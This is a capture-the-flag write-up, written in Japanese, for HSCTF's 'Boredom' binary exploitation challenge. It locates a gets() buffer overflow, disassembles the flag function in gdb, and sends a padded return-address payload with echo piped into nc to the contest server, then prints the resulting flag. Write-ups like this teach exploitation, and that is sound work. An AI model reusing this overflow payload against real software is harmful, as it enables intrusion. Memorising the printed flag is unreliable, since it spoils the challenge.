# Boredom:Binary Exploitation:100pts
Keith is bored and stuck at home. Give him some things to do.  
Connect at nc pwn.hsctf.com 5002.  
Note, if you're having trouble getting it to work remotely:  
- check your offset, the offset is slightly different on the remote server  
- the addresses are still the same  

[boredom.c](boredom.c)　　　　[boredom](boredom)  

# Solution
boredom.cを読むとmain内の`gets(toDo);`でBOFできそうだ(本来ならばchecksecする)。  
flag関数を実行することができればよいのでアドレスを調べる。  
```bash
$ gdb boredom
~~~
(gdb) disas flag
Dump of assembler code for function flag:
   0x00000000004011d5 <+0>:     push   %rbp
   0x00000000004011d6 <+1>:     mov    %rsp,%rbp
   0x00000000004011d9 <+4>:     sub    $0x40,%rsp
   0x00000000004011dd <+8>:     lea    0xe60(%rip),%rsi        # 0x402044
   0x00000000004011e4 <+15>:    lea    0xe5b(%rip),%rdi        # 0x402046
   0x00000000004011eb <+22>:    callq  0x401080 <fopen@plt>
   0x00000000004011f0 <+27>:    mov    %rax,-0x8(%rbp)
   0x00000000004011f4 <+31>:    cmpq   $0x0,-0x8(%rbp)
   0x00000000004011f9 <+36>:    jne    0x40121d <flag+72>
   0x00000000004011fb <+38>:    lea    0xe4e(%rip),%rdi        # 0x402050
   0x0000000000401202 <+45>:    callq  0x401030 <puts@plt>
   0x0000000000401207 <+50>:    lea    0xe92(%rip),%rdi        # 0x4020a0
   0x000000000040120e <+57>:    callq  0x401030 <puts@plt>
   0x0000000000401213 <+62>:    mov    $0x1,%edi
   0x0000000000401218 <+67>:    callq  0x401090 <exit@plt>
~~~
```
0x00000000004011d5とわかった。  
gdbを駆使しながらセグフォ周辺を探っていく。  
結果として、以下のようにechoをncに流し込むことでflag関数に飛ばすことができる。  
```bash
$ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd5\x11\x40\x00\x00\x00\x00\x00" | nc pwn.hsctf.com 5002
I'm currently bored out of my mind. Give me sumpfink to do!
Give me something to do: Ehhhhh, maybe later.
Hey, that's a neat idea. Here's a flag for your trouble: flag{7h3_k3y_l0n3l1n355_57r1k35_0cff9132}

Now go away.
```

## flag{7h3_k3y_l0n3l1n355_57r1k35_0cff9132}